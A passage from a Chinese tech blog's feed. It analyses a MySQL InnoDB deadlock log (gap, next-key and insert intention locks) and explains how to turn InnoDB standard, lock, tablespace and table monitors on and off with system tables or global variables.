1</span><br><span class="line">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class="built_in">log</span> entries 1</span><br><span class="line">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</span><br><span class="line">insert INTO t values (6, 6)</span><br><span class="line">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class="built_in">test</span>`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</span><br><span class="line">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000009; asc     ;;</span><br><span class="line"> 1: len 4; hex 80000009; asc     ;;</span><br><span class="line"></span><br><span class="line">*** (2) TRANSACTION:</span><br><span class="line">TRANSACTION 41122, ACTIVE 46 sec inserting</span><br><span class="line">mysql tables <span class="keyword">in</span> use 1, locked 1</span><br><span class="line">5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class="built_in">log</span> entries 1</span><br><span class="line">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37555 localhost ::1 root update</span><br><span class="line">insert INTO t values (7, 7)</span><br><span class="line">*** (2) HOLDS THE LOCK(S):</span><br><span class="line">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class="built_in">test</span>`.`t` trx id 41122 lock_mode X</span><br><span class="line">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000009; asc     ;;</span><br><span class="line"> 1: len 4; hex 80000009; asc     ;;</span><br><span class="line"></span><br><span class="line">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class="built_in">test</span>`.`t` trx id 41122 lock_mode X locks gap before rec insert intention waiting</span><br><span class="line">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</span><br><span class="line"> 0: len 4; hex 80000009; asc     ;;</span><br><span class="line"> 1: len 4; hex 80000009; asc     ;;</span><br><span class="line"></span><br><span class="line">*** WE ROLL BACK TRANSACTION (2)</span><br></pre></td></tr></table></figure><p>由上述死锁日志可知：两个事务都在等待加在这个位置的锁 <strong>space id 245 page no 4 n bits 80</strong>。<br>另外，</p><h3 id="4-解读InnoDB运行状态"><a href="#4-解读InnoDB运行状态" class="headerlink" title="4. 解读InnoDB运行状态"></a>4. 解读InnoDB运行状态</h3><h4 id="事务T1"><a href="#事务T1" class="headerlink" title="事务T1"></a>事务T1</h4><p>事务T1总共 <strong>要加</strong> 5把锁：1把表，4把行锁。</p><p><strong>表锁</strong><br>表锁类型：IX</p><p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (1, 4]。<br>内存位置：space id 245 page no 4 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 2;</p><p>primary 上的排他 record lock，范围：primary=4。<br>内存位置：space id 245 page no 3 n bits 80，heap no 6 PHYSICAL RECORD: n_fields 4;</p><p>idx_b 上的排他 gap lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p><p>idx_b 上的排他 insert intention lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p><p>其中，insert intention lock 是正等待加的锁。</p><h4 id="事务T2"><a href="#事务T2" class="headerlink" title="事务T2"></a>事务T2</h4><p><strong>注</strong>：当前分析事务T2占用的锁快照为T2执行插入语句之前状态。</p><p>事务T2总共加了4把锁：1把表，3把行锁。</p><p><strong>表锁</strong><br>表锁类型：IX</p><p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (4， 9]<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p><p>primary 上的排他 record lock，范围：primary=9<br>内存位置：space id 245 page no 3 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 4;</p><p>idx_b 上的排他 gap lock，范围：idx_b in (9， 15)<br>内存位置：space id 245 page no 4 n bits 80，heap no 9 PHYSICAL RECORD: n_fields 2;</p><h4 id="死锁分析"><a href="#死锁分析" class="headerlink" title="死锁分析"></a>死锁分析</h4><p>在事务T1插入记录前，事务T1拿到了范围idx_b in (4, 9)的gap lock，事务T2拿到了范围idx_b in (4， 9]上的next-key lock。</p><p>事务T1插入记录(6, 6)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T2已持有next key lock是互斥的。<br>于是，事务T1 block，等待事务T2释放范围idx_b in (4， 9]上的next-key lock。</p><p>事务T2插入记录(7, 7)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T1已持有的gap lock是互斥的。<br>于是，事务T2也会block，等待事务T2释放范围idx_b in (4， 9)上的gap lock。<br>死锁便产生了。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、表结构&quot;&gt;&lt;a href=&quot;#一、表结构&quot; class=&quot;headerlink&quot; title=&quot;一、表结构&quot;&gt;&lt;/a&gt;一、表结构&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CREATE TABLE `t` (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `id` int(11) NOT NULL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `stage` int(11) NOT NULL,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  PRIMARY KEY (`id`),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  KEY `idx_b` (`stage`)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;) ENGINE=InnoDB DEFAULT CHARSET=utf8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;二、表数据&quot;&gt;&lt;a href=&quot;#二、表数据&quot; class=&quot;headerlink&quot; title=&quot;二、表数据&quot;&gt;&lt;/a&gt;二、表数据&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;+------+---------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   id |   stage |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|------+---------|&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|    1 |       1 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|    4 |       4 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|    9 |       9 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|   15 |      15 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+------+---------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;三、简单实例&quot;&gt;&lt;a href=&quot;#三、简单实例&quot; class=&quot;headerlink&quot; title=&quot;三、简单实例&quot;&gt;&lt;/a&gt;三、简单实例&lt;/h2&gt;&lt;h3 id=&quot;1-事务执行时序表&quot;&gt;&lt;a href=&quot;#1-事务执行时序表&quot; class=&quot;headerlink&quot; title=&quot;1. 事务执行时序表&quot;&gt;&lt;/a&gt;1. 事务执行时序表&lt;/h3&gt;&lt;p&gt;事务(ID:41114)，在索引idx_b值为4上加排他锁。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;T1(41114)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;begin;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;select * from t where stage = 4 for update;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;2-查看InnoDB运行状态&quot;&gt;&lt;a href=&quot;#2-查看InnoDB运行状态&quot; class=&quot;headerlink&quot; title=&quot;2. 查看InnoDB运行状态&quot;&gt;&lt;/a&gt;2. 查看InnoDB运行状态&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;---TRANSACTION 41114, ACTIVE 41 sec&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4 lock struct(s), heap size 1184, 3 row lock(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;TABLE LOCK table `&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;`.`t` trx id 41114 lock mode IX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;`.`t` trx id 41114 lock_mode X&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0: len 4; hex 80000004; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 1: len 4; hex 80000004; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;`.`t` trx id 41114 lock_mode X locks rec but not gap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0: len 4; hex 80000004; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 1: len 6; hex 00000000a08b; asc       ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 2: len 7; hex dd000001fa0110; asc        ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 3: len 4; hex 80000004; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;`.`t` trx id 41114 lock_mode X locks gap before rec&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 0: len 4; hex 80000009; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 1: len 4; hex 80000009; asc     ;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-解读InnoDB运行状态&quot;&gt;&lt;a href=&quot;#3-解读InnoDB运行状态&quot; class=&quot;headerlink&quot; title=&quot;3. 解读InnoDB运行状态&quot;&gt;&lt;/a&gt;3. 解读InnoDB运行状态&lt;/h3&gt;&lt;p&gt;事务T1总共加了4把锁：1把表，3把行锁。&lt;br&gt;表锁类型：IX&lt;/p&gt;
&lt;p&gt;行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。&lt;br&gt;加在聚集索引上的行锁1把，是一个排他的记录锁；&lt;br&gt;加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。&lt;/p&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="innodb" scheme="http://yeshaoting.cn/tags/innodb/"/>
    
  </entry>
  
  <entry>
    <title>开启InnoDB监控</title>
    <link href="http://yeshaoting.cn/article/database/%E5%BC%80%E5%90%AFInnoDB%E7%9B%91%E6%8E%A7/"/>
    <id>http://yeshaoting.cn/article/database/%E5%BC%80%E5%90%AFInnoDB%E7%9B%91%E6%8E%A7/</id>
    <published>2016-08-04T03:09:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><p>当前mysql版本：5.6.27</p><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>在mysql处理死锁问题时，由于<code>show engine innodb status</code>输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。</p><p>于是，需要能查看到更详细的事务锁占用情况。</p><h2 id="二、INNODB监控机制-InnoDB-Monitors"><a href="#二、INNODB监控机制-InnoDB-Monitors" class="headerlink" title="二、INNODB监控机制(InnoDB Monitors)"></a>二、INNODB监控机制(InnoDB Monitors)</h2><p>mysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：<code>show engine innodb status</code>输出到控制台。<br>此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。</p><p>官方说明(详见参考文档1)如下：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">When you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.</span><br></pre></td></tr></table></figure></blockquote><p>该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。<br>建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。</p><h2 id="三、开启状态监控"><a href="#三、开启状态监控" class="headerlink" title="三、开启状态监控"></a>三、开启状态监控</h2><p>INNODB监控机制目前主要提供如下四类监控：</p><ul><li>标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。</li><li>锁监控(InnoDB Lock Monitor)：提供额外的锁信息。</li><li>表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。</li><li>表监控(InnoDB Table Monitor)：显示内部数据字典的内容。</li></ul><p>关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。<br>基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。</p><h3 id="1-标准监控-Standard-InnoDB-Monitor"><a href="#1-标准监控-Standard-InnoDB-Monitor" class="headerlink" title="1. 标准监控(Standard InnoDB Monitor)"></a>1. 标准监控(Standard InnoDB Monitor)</h3><h4 id="基于系统表：innodb-monitor"><a href="#基于系统表：innodb-monitor" class="headerlink" title="基于系统表：innodb_monitor"></a>基于系统表：innodb_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_monitor</code>的数据表，来判断是否开启标准监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> innodb_monitor (a <span class="type">INT</span>) ENGINE<span class="operator">=</span>INNODB;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> innodb_monitor;</span><br></pre></td></tr></table></figure><h4 id="基于系统参数：innodb-status-output"><a href="#基于系统参数：innodb-status-output" class="headerlink" title="基于系统参数：innodb_status_output"></a>基于系统参数：innodb_status_output</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output</code>)的方式开启或者关闭标准监控。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output<span class="operator">=</span>OFF;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-开启锁监控-InnoDB-Lock-Monitor"><a href="#2-开启锁监控-InnoDB-Lock-Monitor" class="headerlink" title="2. 开启锁监控(InnoDB Lock Monitor)"></a>2. 开启锁监控(InnoDB Lock Monitor)</h3><h4 id="基于系统表：innodb-lock-monitor"><a href="#基于系统表：innodb-lock-monitor" class="headerlink" title="基于系统表：innodb_lock_monitor"></a>基于系统表：innodb_lock_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_lock_monitor</code>的数据表，来判断是否开启锁监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> innodb_lock_monitor (a <span class="type">INT</span>) ENGINE<span class="operator">=</span>INNODB;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> innodb_lock_monitor;</span><br></pre></td></tr></table></figure><h4 id="基于系统参数：innodb-status-output-locks"><a href="#基于系统参数：innodb-status-output-locks" class="headerlink" title="基于系统参数：innodb_status_output_locks"></a>基于系统参数：innodb_status_output_locks</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output_locks</code>)的方式开启或者关闭标准监控。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output_locks<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output_locks<span class="operator">=</span>OFF;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：前提需要开启 <code>innodb_status_output</code></p><h2 id="3-开启表空间监控-InnoDB-Tablespace-Monitor"><a href="#3-开启表空间监控-InnoDB-Tablespace-Monitor" class="headerlink" title="3. 开启表空间监控(InnoDB Tablespace Monitor)"></a>3. 开启表空间监控(InnoDB Tablespace Monitor)</h2><h4 id="基于系统表：innodb-tablespace-monitor"><a href="#基于系统表：innodb-tablespace-monitor" class="headerlink" title="基于系统表：innodb_tablespace_monitor"></a>基于系统表：innodb_tablespace_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_tablespace_monitor</code>的数据表，来判断是否开启表空间监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> innodb_tablespace_monitor (a <span class="type">INT</span>) ENGINE<span class="operator">=</span>INNODB;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> innodb_tablespace_monitor;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：表空间监控暂不支持通过参数方式配置，并且未来会被废弃。</p><h2 id="4-开启表监控-InnoDB-Table-Monitor"><a href="#4-开启表监控-InnoDB-Table-Monitor" class="headerlink" title="4. 开启表监控(InnoDB Table Monitor)"></a>4. 开启表监控(InnoDB Table Monitor)</h2><p>mysql会通过检查是否存在名为<code>innodb_table_monitor</code>的数据表，来判断是否开启表监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> innodb_table_monitor (a <span class="type">INT</span>) ENGINE<span class="operator">=</span>INNODB;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> innodb_table_monitor;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：表监控暂不支持通过参数方式配置，并且未来会被废弃。</p><h2 id="四、注意事宜"><a href="#四、注意事宜" class="headerlink" title="四、注意事宜"></a>四、注意事宜</h2><h3 id="1-监控复位"><a href="#1-监控复位" class="headerlink" title="1. 监控复位"></a>1. 监控复位</h3><p>需要特别注意的一点是：mysql服务重启后，需要重启开启相应监控，才会生效。换句话说，服务重启后，之前配置的所有监控都被复位，处于关闭状态。</p><p>基于系统表方式开启的监控，在mysql服务重启后，即使表存在，监控也不会生效。需要重启drop表，再create表，才能使监控生效。</p><p>基于系统参数方式开启的监控，在mysql服务重启后，相关系统参数值都是OFF。需要重启设置对应的参数，才能使用监控生效。</p><h3 id="2-错误日志大小"><a href="#2-错误日志大小" class="headerlink" title="2. 错误日志大小"></a>2. 错误日志大小</h3><p>不在停机或重启情况下，mysql每15秒输出一次INNODB运行状态信息到错误日志。<br>这会使用日志变得越来越大。建议在需要的时候开启，不需要的时候关闭掉。</p><h3 id="3-基于表方式将来会被废弃"><a href="#3-基于表方式将来会被废弃" class="headerlink" title="3. 基于表方式将来会被废弃"></a>3. 基于表方式将来会被废弃</h3><p>基于表方式将来会被废弃，使用基于系统参数的方式开启。</p><blockquote><p>Use INFORMATION_SCHEMA or PERFORMANCE_SCHEMA tables or SET GLOBAL innodb_status_output=ON.</p></blockquote><h3 id="4-基于表方式无关表结构及内容"><a href="#4-基于表方式无关表结构及内容" class="headerlink" title="4. 基于表方式无关表结构及内容"></a>4. 基于表方式无关表结构及内容</h3><p>基于表方式，mysql只检验表名被创建，则开启监控。<br>至于，表创建到哪个数据库、表具体的数据结构、表里的内容都不关心，不会对监控开启有任何影响。</p><h3 id="5-日志状态输出时间"><a href="#5-日志状态输出时间" class="headerlink" title="5. 日志状态输出时间"></a>5. 日志状态输出时间</h3><p>虽说状态日志是每15秒周期性输出一次，但是由于状态收集与输出也会占用一些时间，特别是表空间日志(INNODB TABLE MONITOR OUTPUT)和表日志(INNODB TABLESPACE MONITOR OUTPUT)。因此，两次日志时间并不是规律的间隔15秒，而是自上次输出后15秒加上收集输出监控日志的时间。</p><h2 id="五、补充知识"><a href="#五、补充知识" class="headerlink" title="五、补充知识"></a>五、补充知识</h2><h3 id="1-查看错误日志输出位置"><a href="#1-查看错误日志输出位置" class="headerlink" title="1. 查看错误日志输出位置"></a>1. 查看错误日志输出位置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql root@localhost:<span class="built_in">test</span>&gt; select @@log_error;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| @@log_error                            |</span><br><span class="line">|----------------------------------------|</span><br><span class="line">| /usr/<span class="built_in">local</span>/mysql/data/mysqld.local.err |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="2-查看历史日志开启状态与输出位置"><a href="#2-查看历史日志开启状态与输出位置" class="headerlink" title="2. 查看历史日志开启状态与输出位置"></a>2. 查看历史日志开启状态与输出位置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql root@localhost:<span class="built_in">test</span>&gt; show VARIABLES like <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">| Variable_name    | Value                                 |</span><br><span class="line">|------------------+---------------------------------------|</span><br><span class="line">| general_log      | ON                                    |</span><br><span class="line">| general_log_file | /usr/<span class="built_in">local</span>/mysql/data/yerba-buena.log |</span><br><span class="line">+------------------+---------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="3-监控日志解读"><a href="#3-监控日志解读" class="headerlink" title="3. 监控日志解读"></a>3. 监控日志解读</h3><p>详见参考文档2及参考文档5</p><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ol><li><a href="https://dev.mysql.com/doc/refman/5.6/en/innodb-enabling-monitors.html">Enabling InnoDB Monitors</a></li><li><a href="https://dev.mysql.com/doc/refman/5.6/en/innodb-standard-monitor.html">InnoDB Standard Monitor and Lock Monitor Output</a></li><li><a href="http://www.xaprb.com/blog/2007/09/18/how-to-debug-innodb-lock-waits/">How to debug InnoDB lock waits</a></li><li><a href="http://www.xaprb.com/blog/2006/07/31/how-to-analyze-innodb-mysql-locks/">How to find out who is locking a table in MySQL</a></li><li><a href="http://blog.csdn.net/zyz511919766/article/details/50147283">InnoDB Monitor</a></li><li><a href="http://blog.sina.com.cn/s/blog_5037eacb0102vj1w.html">INNODB监控开关</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;当前mysql版本：5.6.27&lt;/p&gt;
